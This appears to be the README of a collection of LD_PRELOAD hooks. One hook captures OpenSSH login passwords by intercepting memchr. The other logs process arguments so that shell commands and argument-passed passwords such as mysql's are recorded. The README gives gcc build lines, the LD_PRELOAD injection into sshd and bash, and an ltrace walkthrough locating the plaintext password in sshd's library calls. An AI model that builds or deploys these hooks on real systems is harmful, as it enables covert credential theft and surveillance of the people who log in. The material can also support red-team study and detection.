# LD_PRELOAD hooks
 A collection of shared objects that are used as LD_PRELOAD hooks

# sshd_memchar_hook
The goal of this hook is to read and output OpenSSH passwords

## sshd_memchar_hook compile/usage

    gcc sshd_memchar_hook.c -o /tmp/sshd_memchar_hook.so -fPIC -shared -ldl -D_GNU_SOURCE
    LD_PRELOAD=/tmp/sshd_memchar_hook.so /usr/sbin/sshd -D -f /etc/ssh/sshd_config_tmp

# shell_arg_hook
This hook records commands typed into a shell. It does this with the simple trick of logging argc and argv arguments that are sent to a process. This is accomplished by placing the function in the `.init_array` section. This means it has access to argc and argv, where it can then log them. The executable will then proceed as normal.

This has other implications, for example the question here: https://unix.stackexchange.com/questions/88665/how-does-ps-know-to-hide-passwords

If this .so is injected in the mysql startup, the password will be available in the log.

This was written to be used in conjunction with `sshd_memchar_hook` to record what password is used, and then what commands are run on the box.

## shell_arg_hook compile/usage

    gcc shell_arg_hook.c -o /tmp/shell_arg_hook.so -fPIC -shared -ldl -D_GNU_SOURCE
    LD_PRELOAD=/tmp/shell_arg_hook.so bash

# Example Setup

First, lets configure an OpenSSH server without overwriting the running one.
These commands just create a second sshd config listening on port 2222, runs, and confirms

    sed "s/#Port 22/Port 2222/" /etc/ssh/sshd_config > /etc/ssh/sshd_config_tmp
    /usr/sbin/sshd -D -f /etc/ssh/sshd_config_tmp
    ss -lntp # Confirm listening on port 2222

# How it works / why memchar?
First, lets look at all the library calls that ssh makes. The "-f" flag for ltrace is VERY important, since there is a lot of forking going on

    root@kali:~/tmp# ltrace -f /usr/sbin/sshd -D -f /etc/ssh/sshd_config_tmp 2>sshd_dump.log

In another terminal, lets create a login event. The password I will be typing in is `FAKEPASSWORD`

    root@kali:/tmp# ssh FAKEUSER@127.0.0.1 -p 2222
    FAKEUSER@127.0.0.1's password:

Now lets look at the output, and see what calls we are interested in:

    root@kali:~/tmp# grep FAKE sshd_dump.log 
    [pid 14878] memchr("FAKEUSER", '\0', 8)                                                                                                = 0
    [pid 14878] memcpy(0x561856c41c60, "FAKEUSER", 8)                                                                                      = 0x561856c41c60
    [pid 14878] strchr("FAKEUSER", '/')                                                                                                    = nil
    [pid 14878] strchr("FAKEUSER", ':')                                                                                                    = nil
    [pid 14878] strlen("FAKEUSER")                                                                                                         = 8
    [pid 14878] memcpy(0x561856c33cc4, "FAKEUSER", 8)                                                                                      = 0x561856c33cc4
    [pid 14877] memchr("FAKEUSER", '\0', 8)                                                                                                = 0
    [pid 14877] memcpy(0x561856c312a0, "FAKEUSER", 8)                                                                                      = 0x561856c312a0
    [pid 14877] getpwnam("FAKEUSER")                                                                                                       = 0
    [pid 14877] strncpy(0x7ffd72e5666c, "FAKEUSER", 32)                                                                                    = 0x7ffd72e5666c
    [pid 14878] strlen("FAKEUSER")                                                                                                         = 8
    [pid 14878] memcpy(0x561856c31100, "FAKEUSER\0", 9)                                                                                    = 0x561856c31100
    [pid 14878] strlen("11607582978119444942FAKEUSER")                                                                                     = 28
    [pid 14878] memchr("FAKEUSER", '\0', 8)                                                                                                = 0
    [pid 14878] memcpy(0x561856c3bc70, "FAKEUSER", 8)                                                                                      = 0x561856c3bc70
    [pid 14878] strchr("FAKEUSER", '/')                                                                                                    = nil
    [pid 14878] strchr("FAKEUSER", ':')                                                                                                    = nil
    [pid 14878] strcmp("FAKEUSER", "FAKEUSER")                                                                                             = 0
    [pid 14878] strlen("11607582978119444942FAKEUSER")                                                                                     = 28
    [pid 14878] memcpy(0x561856c351f0, "\0\0\002\310\0062\0\0\0\bFAKEUSER\0\0\0\016ssh-connec"..., 256)                                    = 0x561856c351f0
    [pid 14878] memchr("FAKEUSER", '\0', 8)                                                                                                = 0
    [pid 14878] memcpy(0x561856c3bc70, "FAKEUSER", 8)                                                                                      = 0x561856c3bc70
    [pid 14878] strchr("FAKEUSER", '/')                                                                                                    = nil
    [pid 14878] strchr("FAKEUSER", ':')                                                                                                    = nil
    [pid 14878] strcmp("FAKEUSER", "FAKEUSER")                                                                                             = 0
    [pid 14878] memchr("FAKEPASSWORD{\347ju\307#\244\032R\0241PW\021\271\320\t\005\324Q"..., '\0', 12)                                     = 0
    [pid 14878] memcpy(0x561856c454f0, "FAKEPASSWORD", 12)                                                                                 = 0x561856c454f0
    [pid 14878] strlen("FAKEPASSWORD")                                                                                                     = 12
    [pid 14878] memcpy(0x561856c34414, "FAKEPASSWORD", 12)                                                                                 = 0x561856c34414
    [pid 14877] memchr("FAKEPASSWORD", '\0', 12)                                                                                           = 0
    [pid 14877] memcpy(0x561856c514a0, "FAKEPASSWORD", 12)                                                                                 = 0x561856c514a0
    [pid 14877] strlen("FAKEPASSWORD")                                                                                                     = 12
    [pid 14877] strlen("FAKEPASSWORD")                                                                                                     = 12
    [pid 14878] strlen("11607582978119444942FAKEUSER" <unfinished ...>
    [pid 14877] strncpy(0x7ffd72e566bc, "FAKEUSER", 32)                                                                                    = 0x7ffd72e566bc
    root@kali:~/tmp# grep strlen sshd_dump.log | wc -l
    5079
    root@kali:~/tmp# grep memcpy sshd_dump.log | wc -l
    1320
    root@kali:~/tmp# grep memchr sshd_dump.log | wc -l
    105

So, `memchr` looks pretty interesting. It has the lowest number of calls while showing the data that we want.